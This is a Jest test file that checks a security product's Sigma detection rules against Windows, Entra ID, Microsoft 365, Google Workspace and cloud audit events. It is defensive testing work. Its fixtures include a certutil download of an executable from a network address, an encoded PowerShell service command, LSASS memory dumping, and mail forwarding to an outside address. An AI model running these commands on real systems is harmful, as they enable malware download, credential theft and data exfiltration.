import { describe, expect, test } from "@jest/globals";
import { JSONObject } from "../../../Types/JSON";
import { DetectionRuleDataKind } from "../../../Types/SecurityEvent/DetectionRuleDataKind";
import {
  DETECTION_RULE_LIBRARY,
  DetectionRuleLibraryEntry,
} from "../../../Types/SecurityEvent/DetectionRuleLibrary";
import NormalizedSecurityEvent from "../../../Types/SecurityEvent/NormalizedSecurityEvent";
import SigmaRule from "../../../Types/SecurityEvent/SigmaRule";
import {
  ENTRA_ID_PRODUCT_NAME,
  EntraLog,
  readEntraDirectoryAudit,
  readEntraSignIn,
} from "../../../Utils/SecurityEvent/Connectors/EntraIdNormalizer";
import GoogleWorkspaceNormalizer from "../../../Utils/SecurityEvent/Connectors/GoogleWorkspaceNormalizer";
import SecurityLogParser from "../../../Utils/SecurityEvent/LogParsers/SecurityLogParser";
import { toNormalizedSecurityEvent } from "../../../Utils/SecurityEvent/SecurityRecordReading";
import SigmaRuleParser from "../../../Utils/SecurityEvent/Sigma/SigmaRuleParser";
import {
  entraConsent,
  entraExport,
  entraFailedSignIn,
  entraRoleAssignment,
  entraSignIn,
  azureActivityApiEvent,
  azureActivityExport,
} from "./Connectors/EntraIdFixtures";
import { googleWorkspaceActivity } from "./Connectors/GoogleWorkspaceFixtures";
import { readMicrosoft365Record } from "../../../Utils/SecurityEvent/Connectors/Microsoft365AuditNormalizer";
import {
  exchangeCmdlet,
  outlookInboxRule,
} from "./Connectors/Microsoft365Fixtures";
import { googleAuditEntry } from "./LogParsers/GoogleCloudAuditFixtures";
import { logLine } from "./LogParsers/LogParserFixtures";
import { sigmaRuleMatchesEvent } from "./LogParsers/SigmaTestMatcher";
import {
  collectorOtlpBody,
  processCreated,
  successfulSignIn,
  windowsEvent,
} from "./LogParsers/WindowsEventFixtures";

/*
 * Contract under test - the rule library's rules for the sources added
 * with Windows events, Google Cloud and Azure audit logs, Microsoft Entra
 * ID and Google Workspace fire on the events those sources make, read the
 * way the engine reads a rule, and stay quiet on their everyday events.
 */

function rule(title: string): SigmaRule {
  const entry: DetectionRuleLibraryEntry | undefined =
    DETECTION_RULE_LIBRARY.find((candidate: DetectionRuleLibraryEntry) => {
      return candidate.title === title;
    });

  if (!entry) {
    throw new Error(`No library rule titled ${title}`);
  }

  return SigmaRuleParser.parse(entry.sigmaRuleYaml);
}

function fromLog(body: string): NormalizedSecurityEvent {
  const events: Array<NormalizedSecurityEvent> = SecurityLogParser.parse(
    logLine(body),
  );

  expect(events.length).toBeGreaterThan(0);

  return events[0]!;
}

function windows(
  eventId: number,
  provider: string,
  channel: string,
  data: Array<[string, string]>,
): NormalizedSecurityEvent {
  return fromLog(
    collectorOtlpBody(windowsEvent(eventId, provider, channel, data)),
  );
}

// Entra ID's records as the connection makes them (Microsoft Graph's own shape).
function entraConnection(
  record: JSONObject,
  kind: "signIn" | "audit",
): NormalizedSecurityEvent {
  return toNormalizedSecurityEvent({
    reading:
      kind === "signIn"
        ? readEntraSignIn(record, EntraLog.SignInLogs)
        : readEntraDirectoryAudit(record),
    vendorName: "Microsoft",
    productName: ENTRA_ID_PRODUCT_NAME,
    raw: record,
  });
}

// A Microsoft 365 audit record as the Microsoft Entra ID connection makes it.
function microsoft365(record: JSONObject): NormalizedSecurityEvent {
  const reading: ReturnType<typeof readMicrosoft365Record> =
    readMicrosoft365Record(record, "Audit.Exchange");

  expect(reading).not.toBeNull();

  return toNormalizedSecurityEvent({
    reading: reading!,
    vendorName: "Microsoft",
    productName: ENTRA_ID_PRODUCT_NAME,
    raw: record,
  });
}

function workspace(activity: JSONObject): NormalizedSecurityEvent {
  const events: Array<NormalizedSecurityEvent> =
    GoogleWorkspaceNormalizer.normalize(activity);

  expect(events.length).toBeGreaterThan(0);

  return events[0]!;
}

const SECURITY: string = "Microsoft-Windows-Security-Auditing";
const DEFENDER: string = "Microsoft-Windows-Windows Defender";

interface Case {
  title: string;
  fires: Array<[string, () => NormalizedSecurityEvent]>;
  quiet: Array<[string, () => NormalizedSecurityEvent]>;
}

const CASES: Array<Case> = [
  {
    title: "Windows event log cleared",
    fires: [
      [
        "the Security log cleared",
        (): NormalizedSecurityEvent => {
          return fromLog(
            collectorOtlpBody(
              windowsEvent(1102, "Microsoft-Windows-Eventlog", "Security", [], {
                userData: {
                  name: "LogFileCleared",
                  fields: [["SubjectUserName", "alice"]],
                },
              }),
            ),
          );
        },
      ],
      [
        "the System log cleared",
        (): NormalizedSecurityEvent => {
          return windows(104, "Microsoft-Windows-Eventlog", "System", []);
        },
      ],
    ],
    quiet: [
      [
        "a failed sign-in",
        (): NormalizedSecurityEvent => {
          return windows(4625, SECURITY, "Security", [["TargetUserName", "a"]]);
        },
      ],
    ],
  },
  {
    title: "Service installed that runs a command or a script",
    fires: [
      [
        "a service whose image is an encoded PowerShell command",
        (): NormalizedSecurityEvent => {
          return windows(7045, "Service Control Manager", "System", [
            ["ServiceName", "updater"],
            ["ImagePath", "%COMSPEC% /c powershell -enc SQBFAFgA"],
          ]);
        },
      ],
      [
        "a service from a user's AppData folder",
        (): NormalizedSecurityEvent => {
          return windows(4697, SECURITY, "Security", [
            ["ServiceName", "svc"],
            [
              "ServiceFileName",
              "C:\\Users\\alice\\AppData\\Local\\Temp\\svc.exe",
            ],
          ]);
        },
      ],
    ],
    quiet: [
      [
        "a service from Program Files",
        (): NormalizedSecurityEvent => {
          return windows(7045, "Service Control Manager", "System", [
            ["ServiceName", "Backup Agent"],
            ["ImagePath", '"C:\\Program Files\\Backup\\agent.exe" -service'],
          ]);
        },
      ],
    ],
  },
  {
    title: "LSASS memory read by another process",
    fires: [
      [
        "a dumper opening LSASS for everything",
        (): NormalizedSecurityEvent => {
          return windows(
            10,
            "Microsoft-Windows-Sysmon",
            "Microsoft-Windows-Sysmon/Operational",
            [
              ["SourceImage", "C:\\Users\\alice\\procdump64.exe"],
              ["TargetImage", "C:\\Windows\\system32\\lsass.exe"],
              ["GrantedAccess", "0x1fffff"],
            ],
          );
        },
      ],
    ],
    quiet: [
      [
        "a process reading LSASS's name only",
        (): NormalizedSecurityEvent => {
          return windows(
            10,
            "Microsoft-Windows-Sysmon",
            "Microsoft-Windows-Sysmon/Operational",
            [
              ["SourceImage", "C:\\Windows\\System32\\svchost.exe"],
              ["TargetImage", "C:\\Windows\\system32\\lsass.exe"],
              ["GrantedAccess", "0x1000"],
            ],
          );
        },
      ],
    ],
  },
  {
    title: "Microsoft Defender found malware",
    fires: [
      [
        "a detection",
        (): NormalizedSecurityEvent => {
          return windows(
            1116,
            DEFENDER,
            "Microsoft-Windows-Windows Defender/Operational",
            [["Threat Name", "Trojan:Win32/Wacatac.B!ml"]],
          );
        },
      ],
      [
        "an action that failed",
        (): NormalizedSecurityEvent => {
          return windows(
            1118,
            DEFENDER,
            "Microsoft-Windows-Windows Defender/Operational",
            [["Threat Name", "Trojan:Win32/Wacatac.B!ml"]],
          );
        },
      ],
    ],
    quiet: [
      [
        "a threat removed",
        (): NormalizedSecurityEvent => {
          return windows(
            1117,
            DEFENDER,
            "Microsoft-Windows-Windows Defender/Operational",
            [["Threat Name", "Trojan:Win32/Wacatac.B!ml"]],
          );
        },
      ],
    ],
  },
  {
    title: "Microsoft Defender protection turned off",
    fires: [
      [
        "real-time protection off",
        (): NormalizedSecurityEvent => {
          return windows(
            5001,
            DEFENDER,
            "Microsoft-Windows-Windows Defender/Operational",
            [],
          );
        },
      ],
    ],
    quiet: [
      [
        "a configuration change",
        (): NormalizedSecurityEvent => {
          return windows(
            5007,
            DEFENDER,
            "Microsoft-Windows-Windows Defender/Operational",
            [["New Value", "x"]],
          );
        },
      ],
    ],
  },
  {
    title: "Member added to a Windows administrators group",
    fires: [
      [
        "a member added to Domain Admins",
        (): NormalizedSecurityEvent => {
          return windows(4728, SECURITY, "Security", [
            ["MemberName", "CN=Mallory,DC=corp,DC=example"],
            ["TargetUserName", "Domain Admins"],
          ]);
        },
      ],
    ],
    quiet: [
      [
        "a member added to Finance",
        (): NormalizedSecurityEvent => {
          return windows(4728, SECURITY, "Security", [
            ["MemberName", "CN=Bob,DC=corp,DC=example"],
            ["TargetUserName", "Finance"],
          ]);
        },
      ],
    ],
  },
  {
    title: "Windows account locked out",
    fires: [
      [
        "a lockout",
        (): NormalizedSecurityEvent => {
          return windows(4740, SECURITY, "Security", [
            ["TargetUserName", "alice"],
          ]);
        },
      ],
    ],
    quiet: [
      [
        "an account unlocked",
        (): NormalizedSecurityEvent => {
          return windows(4767, SECURITY, "Security", [
            ["TargetUserName", "alice"],
          ]);
        },
      ],
    ],
  },
  {
    title: "Remote Desktop sign-in from the internet",
    fires: [
      [
        "an RDP sign-in from a public address",
        (): NormalizedSecurityEvent => {
          return fromLog(
            collectorOtlpBody(
              successfulSignIn({ LogonType: "10", IpAddress: "198.51.100.23" }),
            ),
          );
        },
      ],
    ],
    quiet: [
      [
        "an RDP sign-in from the office network",
        (): NormalizedSecurityEvent => {
          return fromLog(
            collectorOtlpBody(
              successfulSignIn({ LogonType: "10", IpAddress: "10.20.0.7" }),
            ),
          );
        },
      ],
      [
        "an RDP sign-in through a gateway that names no address",
        (): NormalizedSecurityEvent => {
          return fromLog(
            collectorOtlpBody(
              successfulSignIn({ LogonType: "10", IpAddress: "-" }),
            ),
          );
        },
      ],
      [
        "a sign-in at the keyboard",
        (): NormalizedSecurityEvent => {
          return fromLog(
            collectorOtlpBody(
              successfulSignIn({ LogonType: "2", IpAddress: "198.51.100.23" }),
            ),
          );
        },
      ],
    ],
  },
  {
    title: "Risky sign-in to Microsoft Entra ID",
    fires: [
      [
        "a high-risk sign-in from the connection",
        (): NormalizedSecurityEvent => {
          return entraConnection(
            entraSignIn({ riskLevelDuringSignIn: "high" }),
            "signIn",
          );
        },
      ],
      [
        "a high-risk sign-in from Azure's export",
        (): NormalizedSecurityEvent => {
          return fromLog(
            JSON.stringify(
              entraExport(
                "SignInLogs",
                entraFailedSignIn({ riskLevelAggregated: "high" }),
              ),
            ),
          );
        },
      ],
    ],
    quiet: [
      [
        "a sign-in at no risk",
        (): NormalizedSecurityEvent => {
          return entraConnection(entraSignIn(), "signIn");
        },
      ],
    ],
  },
  {
    title: "Admin role assigned in Microsoft Entra ID",
    fires: [
      [
        "a role assigned",
        (): NormalizedSecurityEvent => {
          return entraConnection(entraRoleAssignment(), "audit");
        },
      ],
    ],
    quiet: [
      [
        "a consent",
        (): NormalizedSecurityEvent => {
          return entraConnection(entraConsent(), "audit");
        },
      ],
    ],
  },
  {
    title: "App given consent in Microsoft Entra ID",
    fires: [
      [
        "a consent",
        (): NormalizedSecurityEvent => {
          return entraConnection(entraConsent(), "audit");
        },
      ],
    ],
    quiet: [
      [
        "a role assigned",
        (): NormalizedSecurityEvent => {
          return entraConnection(entraRoleAssignment(), "audit");
        },
      ],
    ],
  },
  {
    title: "Credentials added to an app in Microsoft Entra ID",
    fires: [
      [
        "a secret added to a service principal",
        (): NormalizedSecurityEvent => {
          return entraConnection(
            entraConsent({
              activityDisplayName: "Add service principal credentials",
            }),
            "audit",
          );
        },
      ],
      [
        "an app's certificates and secrets changed",
        (): NormalizedSecurityEvent => {
          return entraConnection(
            entraConsent({
              activityDisplayName:
                "Update application \u2013 Certificates and secrets management ",
            }),
            "audit",
          );
        },
      ],
    ],
    quiet: [
      [
        "an app added",
        (): NormalizedSecurityEvent => {
          return entraConnection(
            entraConsent({ activityDisplayName: "Add application" }),
            "audit",
          );
        },
      ],
    ],
  },
  {
    title: "Suspicious sign-in flagged by Google",
    fires: [
      [
        "a suspicious sign-in",
        (): NormalizedSecurityEvent => {
          return workspace(
            googleWorkspaceActivity("login", "suspicious_login"),
          );
        },
      ],
      [
        "a government-backed attack warning",
        (): NormalizedSecurityEvent => {
          return workspace(
            googleWorkspaceActivity("login", "gov_attack_warning"),
          );
        },
      ],
    ],
    quiet: [
      [
        "a sign-in",
        (): NormalizedSecurityEvent => {
          return workspace(googleWorkspaceActivity("login", "login_success"));
        },
      ],
    ],
  },
  {
    title: "Admin privileges granted in Google Workspace",
    fires: [
      [
        "a role assigned",
        (): NormalizedSecurityEvent => {
          return workspace(
            googleWorkspaceActivity("admin", "ASSIGN_ROLE", [
              { name: "ROLE_NAME", value: "_SEED_ADMIN_ROLE" },
              { name: "USER_EMAIL", value: "mallory@example.com" },
            ]),
          );
        },
      ],
    ],
    quiet: [
      [
        "a user created",
        (): NormalizedSecurityEvent => {
          return workspace(googleWorkspaceActivity("admin", "CREATE_USER"));
        },
      ],
    ],
  },
  {
    title: "2-Step Verification turned off in Google Workspace",
    fires: [
      [
        "a user turning it off",
        (): NormalizedSecurityEvent => {
          return workspace(
            googleWorkspaceActivity("user_accounts", "2sv_disable"),
          );
        },
      ],
      [
        "an administrator turning it off",
        (): NormalizedSecurityEvent => {
          return workspace(
            googleWorkspaceActivity("admin", "TURN_OFF_2_STEP_VERIFICATION"),
          );
        },
      ],
    ],
    quiet: [
      [
        "a user turning it on",
        (): NormalizedSecurityEvent => {
          return workspace(
            googleWorkspaceActivity("user_accounts", "2sv_enroll"),
          );
        },
      ],
    ],
  },
  {
    title: "Domain-wide delegation granted in Google Workspace",
    fires: [
      [
        "an app authorized for the domain",
        (): NormalizedSecurityEvent => {
          return workspace(
            googleWorkspaceActivity("admin", "AUTHORIZE_API_CLIENT_ACCESS", [
              { name: "API_CLIENT_NAME", value: "1234567890" },
            ]),
          );
        },
      ],
    ],
    quiet: [
      [
        "an app a user authorized for themself",
        (): NormalizedSecurityEvent => {
          return workspace(googleWorkspaceActivity("token", "authorize"));
        },
      ],
    ],
  },
  {
    title: "Mail forwarding set up in Microsoft 365",
    fires: [
      [
        "a mailbox set to forward its mail",
        (): NormalizedSecurityEvent => {
          return microsoft365(
            exchangeCmdlet("Set-Mailbox", {
              Identity: "bob",
              ForwardingSmtpAddress: "smtp:collector@fabrikam.example",
            }),
          );
        },
      ],
      [
        "an inbox rule made in Outlook that forwards mail",
        (): NormalizedSecurityEvent => {
          return microsoft365(
            outlookInboxRule(
              '[{"ActionType":"ForwardToRecipientsAction","Recipients":["collector@fabrikam.example"]}]',
            ),
          );
        },
      ],
      [
        "a transport rule that copies mail to someone unseen",
        (): NormalizedSecurityEvent => {
          return microsoft365(
            exchangeCmdlet("New-TransportRule", {
              Name: "Archive",
              BlindCopyTo: "collector@fabrikam.example",
            }),
          );
        },
      ],
    ],
    quiet: [
      [
        "an inbox rule that files mail",
        (): NormalizedSecurityEvent => {
          return microsoft365(
            outlookInboxRule('[{"ActionType":"MoveToFolderAction"}]'),
          );
        },
      ],
      [
        "a mailbox's forwarding cleared",
        (): NormalizedSecurityEvent => {
          return microsoft365(
            exchangeCmdlet("Set-Mailbox", {
              Identity: "bob",
              ForwardingSmtpAddress: "$null",
            }),
          );
        },
      ],
    ],
  },
  {
    title: "File made public in Google Drive",
    fires: [
      [
        "a file opened to anyone with its link",
        (): NormalizedSecurityEvent => {
          return workspace(
            googleWorkspaceActivity("drive", "change_document_visibility", [
              { name: "doc_title", value: "Budget" },
              { name: "visibility", value: "people_with_link" },
            ]),
          );
        },
      ],
      [
        "a file published to the web",
        (): NormalizedSecurityEvent => {
          return workspace(
            googleWorkspaceActivity("drive", "change_document_visibility", [
              { name: "visibility", value: "public_on_the_web" },
            ]),
          );
        },
      ],
    ],
    quiet: [
      [
        "a file made private again",
        (): NormalizedSecurityEvent => {
          return workspace(
            googleWorkspaceActivity("drive", "change_document_visibility", [
              { name: "visibility", value: "private" },
            ]),
          );
        },
      ],
      [
        "a file shared with a colleague",
        (): NormalizedSecurityEvent => {
          return workspace(
            googleWorkspaceActivity("drive", "change_user_access", [
              { name: "owner", value: "alice@example.com" },
              { name: "target_user", value: "carol@example.com" },
            ]),
          );
        },
      ],
    ],
  },
  {
    title: "Service account key created in Google Cloud",
    fires: [
      [
        "a key created",
        (): NormalizedSecurityEvent => {
          return fromLog(JSON.stringify(googleAuditEntry("activity")));
        },
      ],
    ],
    quiet: [
      [
        "a key Google refused to create",
        (): NormalizedSecurityEvent => {
          return fromLog(
            JSON.stringify(
              googleAuditEntry("activity", { status: { code: 7 } }),
            ),
          );
        },
      ],
    ],
  },
  {
    title: "Google Cloud audit logs re-routed or deleted",
    fires: [
      [
        "a sink deleted",
        (): NormalizedSecurityEvent => {
          return fromLog(
            JSON.stringify(
              googleAuditEntry("activity", {
                serviceName: "logging.googleapis.com",
                methodName: "google.logging.v2.ConfigServiceV2.DeleteSink",
              }),
            ),
          );
        },
      ],
    ],
    quiet: [
      [
        "a sink created",
        (): NormalizedSecurityEvent => {
          return fromLog(
            JSON.stringify(
              googleAuditEntry("activity", {
                serviceName: "logging.googleapis.com",
                methodName: "google.logging.v2.ConfigServiceV2.CreateSink",
              }),
            ),
          );
        },
      ],
    ],
  },
  {
    title: "Role assignment created in Azure",
    fires: [
      [
        "a role assignment, as diagnostic settings export it",
        (): NormalizedSecurityEvent => {
          return fromLog(JSON.stringify(azureActivityExport()));
        },
      ],
      [
        "a role assignment, as the REST API returns it",
        (): NormalizedSecurityEvent => {
          return fromLog(
            JSON.stringify(
              azureActivityApiEvent({
                operationName: {
                  value: "Microsoft.Authorization/roleAssignments/write",
                },
              }),
            ),
          );
        },
      ],
    ],
    quiet: [
      [
        "a role assignment that failed",
        (): NormalizedSecurityEvent => {
          return fromLog(
            JSON.stringify(azureActivityExport({ resultType: "Failure" })),
          );
        },
      ],
    ],
  },
  {
    title: "Azure diagnostic setting deleted",
    fires: [
      [
        "a diagnostic setting deleted",
        (): NormalizedSecurityEvent => {
          return fromLog(JSON.stringify(azureActivityApiEvent()));
        },
      ],
    ],
    quiet: [
      [
        "a role assignment",
        (): NormalizedSecurityEvent => {
          return fromLog(JSON.stringify(azureActivityExport()));
        },
      ],
    ],
  },
];

describe("the new sources' library rules", () => {
  const FIRES: Array<[string, string, () => NormalizedSecurityEvent]> =
    CASES.flatMap(
      (item: Case): Array<[string, string, () => NormalizedSecurityEvent]> => {
        return item.fires.map(
          ([name, make]: [string, () => NormalizedSecurityEvent]): [
            string,
            string,
            () => NormalizedSecurityEvent,
          ] => {
            return [item.title, name, make];
          },
        );
      },
    );
  const QUIET: Array<[string, string, () => NormalizedSecurityEvent]> =
    CASES.flatMap(
      (item: Case): Array<[string, string, () => NormalizedSecurityEvent]> => {
        return item.quiet.map(
          ([name, make]: [string, () => NormalizedSecurityEvent]): [
            string,
            string,
            () => NormalizedSecurityEvent,
          ] => {
            return [item.title, name, make];
          },
        );
      },
    );

  test.each(FIRES)(
    "%s fires on %s",
    (title: string, _name: string, make: () => NormalizedSecurityEvent) => {
      expect(sigmaRuleMatchesEvent(rule(title), make())).toBe(true);
    },
  );

  test.each(QUIET)(
    "%s stays quiet on %s",
    (title: string, _name: string, make: () => NormalizedSecurityEvent) => {
      expect(sigmaRuleMatchesEvent(rule(title), make())).toBe(false);
    },
  );

  test("every rule that reads one of the new sources is shown here", () => {
    const newKinds: Array<DetectionRuleDataKind> = [
      DetectionRuleDataKind.WindowsEvents,
      DetectionRuleDataKind.EntraId,
      DetectionRuleDataKind.GoogleWorkspace,
      DetectionRuleDataKind.GoogleCloudAuditLogs,
      DetectionRuleDataKind.AzureActivityLog,
    ];
    const reading: Array<string> = DETECTION_RULE_LIBRARY.filter(
      (entry: DetectionRuleLibraryEntry): boolean => {
        return newKinds.includes(entry.dataKind);
      },
    ).map((entry: DetectionRuleLibraryEntry): string => {
      return entry.title;
    });

    expect(reading.sort()).toEqual(
      CASES.map((item: Case): string => {
        return item.title;
      }).sort(),
    );
  });

  test("the library's endpoint rules read Windows' process events as an EDR's", () => {
    expect(
      sigmaRuleMatchesEvent(
        rule("File downloaded with certutil"),
        fromLog(
          collectorOtlpBody(
            processCreated({
              NewProcessName: "C:\\Windows\\System32\\certutil.exe",
              CommandLine:
                "certutil.exe -urlcache -split -f http://198.51.100.9/a.exe a.exe",
            }),
          ),
        ),
      ),
    ).toBe(true);
  });
});
